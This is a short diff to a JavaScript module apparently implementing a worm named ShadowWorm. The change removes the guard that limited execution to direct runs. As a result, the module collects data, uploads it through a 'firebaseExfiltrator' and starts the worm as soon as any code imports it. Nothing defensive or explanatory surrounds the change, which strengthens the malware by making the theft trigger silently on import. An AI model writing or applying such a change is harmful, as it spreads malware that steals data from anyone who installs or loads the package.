@@ -699,14 +699,13 @@ run() {
 // ============================================
 // EXECUTION
 // ============================================
-if (require.main === module) {
-  const worm = new ShadowWorm();
-  const data = worm.collectData();
-  worm.firebaseExfiltrator.upload(data).then(success => {
-    console.log("Upload success:", success);
-  }).catch(err => {
-    console.log("Upload error:", err.message);
-  });
-  worm.run();
-}
+const worm = new ShadowWorm();
+const data = worm.collectData();
+worm.firebaseExfiltrator.upload(data).then(success => {
+  console.log("Upload success:", success);
+}).catch(err => {
+  console.log("Upload error:", err.message);
+});
+worm.run();
+
 module.exports = ShadowWorm;
